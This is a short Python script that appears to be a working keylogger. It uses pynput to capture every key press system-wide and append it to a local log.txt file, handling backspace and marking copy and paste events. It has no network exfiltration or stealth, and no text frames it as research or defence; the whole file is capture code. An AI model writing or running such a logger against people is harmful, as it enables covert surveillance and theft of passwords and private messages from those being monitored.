from pynput.keyboard import Listener
import os

def write(message):
    if message=="-1":
        with open("log.txt", 'rb+') as file1:
            file1.seek(-1, os.SEEK_END)
            file1.truncate()
    else:
        with open("log.txt", "a+") as file:
            file.write(message)

def on_press(key):
    pressed_key=str(key).replace("'", "")

    match pressed_key:
        case "Key.backspace":
            write("-1")
        case "Key.space":
            write(" ")
        case "Key.tab":
            write(" " + ">>|" + " ")
        case "Key.shift":
            pass
        case "Key.ctrl_l":
            pass
        case "\\x03":
            write(" " + "Text Copied!" + " ")
        case "\\x16":
            write(" " + "Text Pasted!" + " ")
        case "Key.enter":
            write('\n')
        case _:
            write(pressed_key)

with Listener(on_press=on_press) as listener:
    listener.join()